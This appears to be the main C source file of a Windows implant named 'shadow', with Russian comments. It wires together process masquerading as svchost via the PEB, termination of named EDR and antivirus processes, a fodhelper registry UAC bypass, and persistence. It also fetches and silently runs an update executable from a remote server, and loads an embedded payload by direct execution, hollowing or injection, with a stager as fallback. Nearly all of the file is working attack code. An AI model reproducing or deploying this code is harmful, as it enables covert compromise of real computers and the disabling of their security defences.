#include "shadow.h"

// Глобальные переменные для управления поведением
BOOL g_bPersistenceInstalled = FALSE;
BOOL g_bBeaconMode = FALSE;
DWORD g_dwExecutionMethod = 0;

// Функция для парсинга командной строки
VOID ParseCommandLine() {
    LPWSTR lpCmdLine = GetCommandLine();
    
    if (wcsstr(lpCmdLine, L"--beacon")) {
        g_bBeaconMode = TRUE;
    }
    
    if (wcsstr(lpCmdLine, L"--persist")) {
        InstallPersistence();
        g_bPersistenceInstalled = TRUE;
    }
    
    if (wcsstr(lpCmdLine, L"--method")) {
        LPWSTR pMethod = wcsstr(lpCmdLine, L"--method");
        if (pMethod) {
            pMethod += 8; // Пропускаем "--method"
            while (*pMethod == L' ') pMethod++;
            
            if (wcsstr(pMethod, L"direct")) {
                g_dwExecutionMethod = 0;
            } else if (wcsstr(pMethod, L"hollow")) {
                g_dwExecutionMethod = 1;
            } else if (wcsstr(pMethod, L"inject")) {
                g_dwExecutionMethod = 2;
            }
        }
    }
}

// Функция для загрузки пейлоада из встроенных ресурсов
BOOL LoadEmbeddedPayload(LPBYTE* ppPayload, DWORD* pdwPayloadSize) {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
    if (!hRes) return FALSE;
    
    HGLOBAL hResData = LoadResource(NULL, hRes);
    if (!hResData) return FALSE;
    
    DWORD dwSize = SizeofResource(NULL, hRes);
    LPVOID pResData = LockResource(hResData);
    
    if (!pResData || dwSize == 0) return FALSE;
    
    // Выделяем память и копируем пейлоад
    *ppPayload = (LPBYTE)malloc(dwSize);
    if (!*ppPayload) return FALSE;
    
    memcpy(*ppPayload, pResData, dwSize);
    *pdwPayloadSize = dwSize;
    
    return TRUE;
}

// Функция для само-обновления
BOOL SelfUpdate() {
    DEBUG_PRINT("Checking for updates...\n");
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    
    if (!InitializeWinINet(&hSession, &hConnect)) {
        return FALSE;
    }
    
    // Запрашиваем обновление
    HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/update", NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return FALSE;
    }
    
    if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        // Получаем размер обновления
        DWORD dwContentLength = 0;
        DWORD dwBufferSize = sizeof(dwContentLength);
        HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
            &dwContentLength, &dwBufferSize, NULL);
        
        if (dwContentLength > 0) {
            // Загружаем обновление
            LPBYTE pUpdate = (LPBYTE)malloc(dwContentLength);
            DWORD dwBytesRead = 0;
            DWORD dwTotalRead = 0;
            
            while (InternetReadFile(hRequest, pUpdate + dwTotalRead, 4096, &dwBytesRead) && dwBytesRead > 0) {
                dwTotalRead += dwBytesRead;
            }
            
            if (dwTotalRead == dwContentLength) {
                // Сохраняем обновление во временный файл
                WCHAR wzTempPath[MAX_PATH];
                GetTempPath(MAX_PATH, wzTempPath);
                wcscat_s(wzTempPath, L"shadow_update.exe");
                
                HANDLE hFile = CreateFile(wzTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD dwWritten;
                    WriteFile(hFile, pUpdate, dwContentLength, &dwWritten, NULL);
                    CloseHandle(hFile);
                    
                    // Запускаем обновленный файл
                    ShellExecute(NULL, L"open", wzTempPath, NULL, NULL, SW_HIDE);
                    
                    // Выходим из текущего процесса
                    ExitProcess(0);
                }
            }
            
            free(pUpdate);
        }
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    
    return TRUE;
}

// Функция для маскировки процесса
BOOL MasqueradeProcess() {
    // Меняем имя процесса в PEB
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    if (pPEB && pPEB->ProcessParameters) {
        // Копируем имя легитимного процесса
        WCHAR wzMasquerade[] = L"C:\\Windows\\System32\\svchost.exe";
        
        // Меняем ImagePathName
        pPEB->ProcessParameters->ImagePathName.Buffer = wzMasquerade;
        pPEB->ProcessParameters->ImagePathName.Length = wcslen(wzMasquerade) * 2;
        pPEB->ProcessParameters->ImagePathName.MaximumLength = (wcslen(wzMasquerade) + 1) * 2;
        
        // Меняем CommandLine
        pPEB->ProcessParameters->CommandLine.Buffer = wzMasquerade;
        pPEB->ProcessParameters->CommandLine.Length = wcslen(wzMasquerade) * 2;
        pPEB->ProcessParameters->CommandLine.MaximumLength = (wcslen(wzMasquerade) + 1) * 2;
    }
    
    return TRUE;
}

// Функция для блокировки EDR процессов
BOOL BlockEDRProcesses() {
    // Список известных EDR процессов
    LPCWSTR edrProcesses[] = {
        L"MsMpEng.exe", L"MsSense.exe", L"SenseIR.exe",
        L"CSFalconContainer.exe", L"CSFalconService.exe",
        L"CylanceSvc.exe", L"CylanceUI.exe",
        L"TaniumClient.exe", L"TaniumDetectEngine.exe",
        L"SentinelAgent.exe", L"SentinelHelper.exe",
        L"CrowdStrike.exe", L"cb.exe",
        NULL
    };
    
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    
    if (EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        cProcesses = cbNeeded / sizeof(DWORD);
        
        for (unsigned int i = 0; i < cProcesses; i++) {
            if (aProcesses[i] != 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
                
                if (hProcess) {
                    WCHAR wzProcessName[MAX_PATH];
                    DWORD dwSize = MAX_PATH;
                    
                    if (QueryFullProcessImageName(hProcess, 0, wzProcessName, &dwSize)) {
                        // Проверяем имя процесса
                        for (int j = 0; edrProcesses[j] != NULL; j++) {
                            if (wcsstr(wzProcessName, edrProcesses[j])) {
                                // Пытаемся завершить процесс
                                TerminateProcess(hProcess, 0);
                                break;
                            }
                        }
                    }
                    
                    CloseHandle(hProcess);
                }
            }
        }
    }
    
    return TRUE;
}

// Функция для проверки прав администратора
BOOL IsAdmin() {
    BOOL bIsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        
        CheckTokenMembership(NULL, pAdministratorsGroup, &bIsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    
    return bIsAdmin;
}

// Функция для эскалации привилегий
BOOL ElevatePrivileges() {
    if (IsAdmin()) {
        return TRUE; // Уже администратор
    }
    
    // Пытаемся использовать UAC bypass
    WCHAR wzPath[MAX_PATH];
    GetSystemDirectory(wzPath, MAX_PATH);
    wcscat_s(wzPath, L"\\fodhelper.exe");
    
    // Регистрируем обработчик для fodhelper
    HKEY hKey;
    LONG lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    
    if (lResult == ERROR_SUCCESS) {
        WCHAR wzExecutablePath[MAX_PATH];
        GetModuleFileName(NULL, wzExecutablePath, MAX_PATH);
        
        // Добавляем параметр для повышения прав
        wcscat_s(wzExecutablePath, L" --elevated");
        
        RegSetValueEx(hKey, L"", 0, REG_SZ,
            (LPBYTE)wzExecutablePath, (wcslen(wzExecutablePath) + 1) * sizeof(WCHAR));
        
        RegCloseKey(hKey);
        
        // Запускаем fodhelper
        ShellExecute(NULL, L"open", wzPath, NULL, NULL, SW_HIDE);
        
        // Ждем 5 секунд и очищаем реестр
        Sleep(5000);
        RegDeleteKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command");
        
        return TRUE;
    }
    
    return FALSE;
}

// Основная функция
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Парсим командную строку
    ParseCommandLine();
    
    // Маскируем процесс
    MasqueradeProcess();
    
    // Антианализ проверки
    AntiAnalysis();
    
    // Блокируем EDR процессы
    BlockEDRProcesses();
    
    // Устанавливаем персистентность если требуется
    if (!g_bPersistenceInstalled) {
        InstallPersistence();
    }
    
    // Режим beacon
    if (g_bBeaconMode) {
        RunBeacon();
        return 0;
    }
    
    // Проверяем обновления
    SelfUpdate();
    
    // Загружаем встроенный пейлоад
    LPBYTE pPayload = NULL;
    DWORD dwPayloadSize = 0;
    
    if (LoadEmbeddedPayload(&pPayload, &dwPayloadSize)) {
        // Выполняем пейлоад выбранным методом
        LoadPayload(pPayload, dwPayloadSize, g_dwExecutionMethod);
        free(pPayload);
    } else {
        // Режим стейджера
        RunStager();
    }
    
    return 0;
}